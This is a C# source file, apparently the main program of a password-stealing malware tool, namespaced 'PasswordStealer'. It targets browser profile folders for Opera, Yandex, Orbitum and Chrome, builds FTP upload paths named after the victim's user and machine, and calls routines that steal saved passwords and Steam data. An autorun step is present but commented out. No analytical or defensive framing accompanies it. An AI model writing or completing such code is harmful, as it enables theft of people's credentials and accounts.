using System;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Windows.Forms;
using System.Data.SQLite;
using System.Security.Principal;
using System.Management;
using System.Diagnostics;
using Anime;

namespace PasswordStealer
{

    class Program
    {
        public static string FTPLogin = "";
        public static string FTPPassword = "";
        public static string FTP_PATH = "ftp://";
        public static string format = "HH_mm_ss_dd_MM_yyyy";
        public static string[] webBrowsers = { "Opera", "Yandex", "Orbitum", "Chrome" };
        public static string[] environment = { Environment.UserName, Environment.UserName + "." + Environment.MachineName };
        public static string[] webBrowsers_Paths = { @"Roaming\Opera Software\Opera Stable\", @"Local\Yandex\YandexBrowser\User Data\Default\", @"Local\Orbitum\User Data\Default\", @"Local\Google\Chrome\User Data\Default\" };
        public static string PC_NAME = Environment.UserName + "_"+Environment.MachineName +"."+ DateTime.Now.ToString(format) + "/";
        public static string Passwords = FTP_PATH + PC_NAME + "Passwords/";
        public static string SteamData_path = FTP_PATH + PC_NAME + "SteamData/";
        static void Main(string[] args)
        {
            try
            {
                PasswordData.StealPasswords();
                SteamFiles.GetSteamData();
                //AutoLoad.SetAutorunValue(true);
            }
            catch
            {
                Application.Exit();
            }
        }
    }
}
